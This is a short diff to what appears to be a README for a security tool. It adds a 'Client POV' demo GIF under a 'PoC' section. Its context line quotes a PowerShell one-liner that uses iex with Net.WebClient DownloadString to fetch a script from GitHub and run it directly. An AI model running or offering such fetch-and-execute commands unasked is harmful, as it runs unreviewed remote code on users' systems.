@@ -41,6 +41,11 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 <br/><br/>
 ## PoC
 
+### Client POV
+
+<p align="center">
+<img src="test/client.gif?raw=true" width="800">
+</p>
 
 
 <br/><br/>
